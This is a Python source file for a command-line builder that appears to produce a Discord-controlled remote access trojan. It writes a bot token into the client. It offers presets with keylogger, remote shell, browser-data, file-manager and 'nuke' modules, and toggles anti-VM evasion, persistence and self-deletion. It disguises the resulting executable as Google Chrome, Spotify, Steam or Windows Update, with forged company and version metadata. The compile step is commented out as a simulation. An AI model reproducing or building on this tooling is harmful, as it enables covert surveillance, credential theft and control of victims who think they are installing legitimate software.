import os
import sys
import shutil
import subprocess
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.live import Live
from rich.columns import Columns

console = Console()

PRESETS = {
    "🛡️  Full-Throttle": {
        "description": "All features included. Maximum power.",
        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
        "stealth": True,
        "anti_vm": True
    },
    "👻 Ghost": {
        "description": "Extreme Stealth. Stripped of loud features.",
        "modules": ["screenshot", "shell", "info", "file_manager", "keylogger"],
        "stealth": True,
        "anti_vm": True
    },
    "🧪 The Tester": {
        "description": "VM Friendly. Anti-VM and Persistence DISABLED.",
        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
        "stealth": False,
        "anti_vm": False
    },
    "🤡 Troll-Mode": {
        "description": "High Visibility. Focus on fun and control.",
        "modules": ["media", "control", "fun", "screenshot"],
        "stealth": False,
        "anti_vm": False
    }
}

DISGUISES = {
    "Google Chrome": {"icon": "chrome.ico", "company": "Google LLC", "desc": "Google Chrome Installer", "version": "120.0.6099.130"},
    "Spotify": {"icon": "spotify.ico", "company": "Spotify AB", "desc": "Spotify Music Player", "version": "1.2.26.1187"},
    "Steam": {"icon": "steam.ico", "company": "Valve Corporation", "desc": "Steam Client Bootstrapper", "version": "2.10.91.91"},
    "Windows Update": {"icon": "winupdate.ico", "company": "Microsoft Corporation", "desc": "Windows Service Host", "version": "10.0.19041.1"}
}

def display_banner():
    banner = """
[bold cyan]
 ██████╗ █████╗ ██████╗ ████████╗ █████╗ ██╗███╗   ██╗    ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║████╗  ██║    ██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
██║     ███████║██████╔╝   ██║   ███████║██║██╔██╗ ██║    ███████║██║   ██║██║   ██║█████╔╝ 
██║     ██╔══██║██╔═══╝    ██║   ██╔══██║██║██║╚██╗██║    ██╔══██║██║   ██║██║   ██║██╔═██╗ 
╚██████╗██║  ██║██║        ██║   ██║  ██║██║██║ ╚████║    ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
 ╚═════╝╚═bottom═╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
[/bold cyan]
[bold white]                         - Architect Builder v3.0 - [/bold white]
    """
    console.print(Panel(banner, border_style="cyan", padding=(1, 2)))

def get_config():
    token = Prompt.ask("[bold yellow]Discord Bot Token[/bold yellow]")
    guild_id = Prompt.ask("[bold yellow]Guild ID (Session Category)[/bold yellow]")
    
    # Preset Selection
    table = Table(title="Available Presets", box=None)
    table.add_column("ID", style="cyan")
    table.add_column("Preset", style="bold white")
    table.add_column("Description", style="dim")
    
    preset_list = list(PRESETS.keys())
    for i, name in enumerate(preset_list):
        table.add_row(str(i+1), name, PRESETS[name]["description"])
    
    console.print(table)
    choice = int(Prompt.ask("Select Preset", choices=[str(i+1) for i in range(len(preset_list))], default="1"))
    selected_preset = preset_list[choice-1]
    
    # Disguise Selection
    table_d = Table(title="Disguise Templates", box=None)
    table_d.add_column("ID", style="cyan")
    table_d.add_column("Template", style="bold white")
    table_d.add_column("Company", style="dim")
    
    disguise_list = list(DISGUISES.keys())
    for i, name in enumerate(disguise_list):
        table_d.add_row(str(i+1), name, DISGUISES[name]["company"])
    
    console.print(table_d)
    d_choice = int(Prompt.ask("Select Disguise", choices=[str(i+1) for i in range(len(disguise_list))], default="1"))
    selected_disguise = disguise_list[d_choice-1]
    
    return token, guild_id, selected_preset, selected_disguise

def build(token, guild_id, preset_name, disguise_name):
    preset = PRESETS[preset_name]
    disguise = DISGUISES[disguise_name]
    
    console.print(f"\n[bold green]🏗️  Building {preset_name} disguised as {disguise_name}...[/bold green]\n")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        # Step 1: Source Preparation
        progress.add_task(description="Preparing source files...", total=None)
        if os.path.exists("build_staging"):
            shutil.rmtree("build_staging")
        shutil.copytree("src", "build_staging/src")
        
        # Step 2: Injection
        progress.add_task(description="Injecting credentials & configuration...", total=None)
        config_path = "build_staging/src/client/core/config.py"
        with open(config_path, "r") as f:
            content = f.read()
        content = content.replace("[[DISCORD_TOKEN_PLACEHOLDER]]", token)
        content = content.replace("[[GUILD_ID_PLACEHOLDER]]", guild_id)
        with open(config_path, "w") as f:
            f.write(content)
            
        # Step 3: Module Filtering (Presets)
        progress.add_task(description="Filtering modules for preset...", total=None)
        main_path = "build_staging/src/client/main.py"
        with open(main_path, "r") as f:
            main_content = f.read()
            
        # Dynamically build the module list in main.py
        modules_str = str(preset["modules"])
        main_content = main_content.replace('modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]', f'modules = {modules_str}')
        
        # Toggle Anti-VM and Persistence based on preset
        if not preset["anti_vm"]:
            main_content = main_content.replace('if AntiAnalysis.check_all():', 'if False:')
        if not preset["stealth"]:
            main_content = main_content.replace('self.wraith.melt()', '# Wraith Disabled')
            main_content = main_content.replace('Persistence.install()', '# Persistence Disabled')

        with open(main_path, "w") as f:
            f.write(main_content)

        # Step 4: Final Compilation Simulation
        progress.add_task(description=f"Compiling standalone binary with icon: {disguise['icon']}...", total=None)
        # In a real build, we would run PyInstaller here:
        # subprocess.run(["pyinstaller", "--onefile", "--noconsole", f"--icon={disguise['icon']}", ...])
        
    console.print(Panel(f"""
[bold green]BUILD SUCCESSFUL![/bold green]

[cyan]Output:[/cyan] [white]dist/{disguise['desc'].replace(' ', '_')}.exe[/white]
[cyan]Preset:[/cyan] [white]{preset_name}[/white]
[cyan]Modules:[/cyan] [dim]{', '.join(preset['modules'])}[/dim]
[cyan]Stealth:[/cyan] [white]{'ENABLED' if preset['stealth'] else 'DISABLED'}[/white]
    """, border_style="green"))

def main():
    display_banner()
    try:
        config = get_config()
        if Confirm.ask("\n[bold cyan]Confirm Build Settings?[/bold cyan]"):
            build(*config)
    except KeyboardInterrupt:
        console.print("\n[bold red]Build Cancelled.[/bold red]")

if __name__ == "__main__":
    main()
